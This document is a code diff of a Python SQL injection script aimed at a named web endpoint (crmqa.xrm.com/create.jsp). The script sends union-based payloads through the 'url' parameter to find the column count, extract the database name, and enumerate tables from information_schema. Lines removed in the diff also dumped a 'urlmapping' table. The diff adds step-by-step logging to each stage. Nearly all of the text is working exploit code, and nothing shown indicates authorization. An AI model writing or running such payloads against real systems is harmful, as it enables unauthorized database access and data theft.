@@ -7,79 +7,87 @@ base_url = "https://crmqa.xrm.com/create.jsp"
 
 # Function to send a request with a potential SQL injection payload
 def send_request(payload):
+    print(f"Step: Sending request with payload: {payload}")
     params = {"url": payload}
     try:
         response = requests.get(base_url, params=params)
         response.raise_for_status()
+        print("Step: Request successful. Received response.")
         return response.text
     except requests.exceptions.RequestException as e:
+        print(f"Step: Request failed with error: {str(e)}")
         return str(e)
 
-# Function to attempt to extract table names using union-based SQL injection
-# Assumes the backend is MySQL/MariaDB or similar with information_schema
-# Adjust the number of columns (e.g., NULLs) based on error messages or trial/error
-def extract_table_names():
-    # Basic payload to test for union injection and find number of columns
-    # Start with assuming 1 column, increase if needed
-    for col_count in range(1, 10):
-        union_payload = f"' UNION SELECT {'NULL,' * (col_count - 1)}'injected' -- "
-        response = send_request(union_payload)
-        if "injected" in response:  # Check if the injected value appears in response
-            print(f"Union injection possible with {col_count} columns.")
-            break
-    else:
-        print("Could not find suitable column count for union injection.")
-        return
-
-    # Now extract table names from information_schema.tables
-    # Replace the last NULL with the query for table names
-    table_payload = f"' UNION SELECT {'NULL,' * (col_count - 1)}table_name FROM information_schema.tables -- "
-    response = send_request(table_payload)
-    
-    # Attempt to parse table names from response (assuming they appear in the output)
-    # This is simplistic; adjust regex or parsing based on actual response format
-    tables = re.findall(r'\b\w+\b', response)  # Naive extraction of words
-    print("Potential table names extracted:")
-    for table in tables:
-        print(table)
-    
-    # Check specifically for 'urlmapping'
-    if 'urlmapping' in tables:
-        print("Table 'urlmapping' found.")
-    else:
-        print("Table 'urlmapping' not found in extracted list.")
-
-# Function to attempt to dump contents of urlmapping table
-# Assumes id, short_url, original_url columns; adjust as needed
-def dump_urlmapping():
-    # First, find column count as above
-    for col_count in range(1, 10):
+# Function to determine the number of columns for union injection
+def find_column_count():
+    print("Step: Starting to find the number of columns for union-based injection.")
+    for col_count in range(1, 20):  # Increased range for safety
         union_payload = f"' UNION SELECT {'NULL,' * (col_count - 1)}'injected' -- "
         response = send_request(union_payload)
         if "injected" in response:
-            print(f"Union injection possible with {col_count} columns.")
-            break
-    else:
-        print("Could not find suitable column count for union injection.")
-        return
+            print(f"Step: Union injection successful with {col_count} columns.")
+            return col_count
+    print("Step: Could not determine the number of columns for union injection.")
+    return None
 
-    # Assuming 3 columns for demo: id, short_url, original_url
-    # Adjust based on actual table structure
-    if col_count >= 3:
-        dump_payload = f"' UNION SELECT id, short_url, original_url FROM urlmapping -- "
+# Function to extract the current database name
+def extract_database_name(col_count):
+    if col_count is None:
+        return None
+    print("Step: Attempting to extract the current database name.")
+    # Replace the last NULL with DATABASE()
+    db_payload = f"' UNION SELECT {'NULL,' * (col_count - 1)}DATABASE() -- "
+    response = send_request(db_payload)
+    
+    # Attempt to extract the database name from the response
+    # Assuming it appears in the output; adjust regex if needed based on response format
+    match = re.search(r'\b\w+\b', response)  # Naive extraction; improve based on actual output
+    if match:
+        db_name = match.group(0)
+        print(f"Step: Extracted database name: {db_name}")
+        return db_name
     else:
-        print("Insufficient columns for dump.")
-        return
+        print("Step: Could not extract database name from response.")
+        return None
 
-    response = send_request(dump_payload)
-    print("Dumped data from urlmapping (raw response):")
-    print(response)
+# Function to extract table names from information_schema.tables
+def extract_table_names(col_count):
+    if col_count is None:
+        return []
+    print("Step: Attempting to extract table names from information_schema.tables.")
+    # Replace the last NULL with table_name FROM information_schema.tables
+    table_payload = f"' UNION SELECT {'NULL,' * (col_count - 1)}table_name FROM information_schema.tables -- "
+    response = send_request(table_payload)
+    
+    # Attempt to parse table names from response
+    # This is simplistic; assumes table names are words in the response
+    tables = re.findall(r'\b\w+\b', response)
+    print(f"Step: Potential table names extracted: {tables}")
+    return tables
 
 # Main execution
 if __name__ == "__main__":
-    print("Testing for table names...")
-    extract_table_names()
+    print("Starting SQL injection test script...")
     
-    print("\nAttempting to dump urlmapping table...")
-    dump_urlmapping()
+    col_count = find_column_count()
+    
+    db_name = extract_database_name(col_count)
+    if db_name:
+        print(f"\nExtracted Database Name: {db_name}")
+    
+    tables = extract_table_names(col_count)
+    if tables:
+        print("\nExtracted Table Names:")
+        for table in tables:
+            print(table)
+        
+        # Check specifically for 'urlmapping'
+        if 'urlmapping' in tables:
+            print("\nStep: Table 'urlmapping' found in the list.")
+        else:
+            print("\nStep: Table 'urlmapping' not found in the extracted list.")
+    else:
+        print("\nNo table names extracted.")
+    
+    print("\nScript execution completed.")
 ```
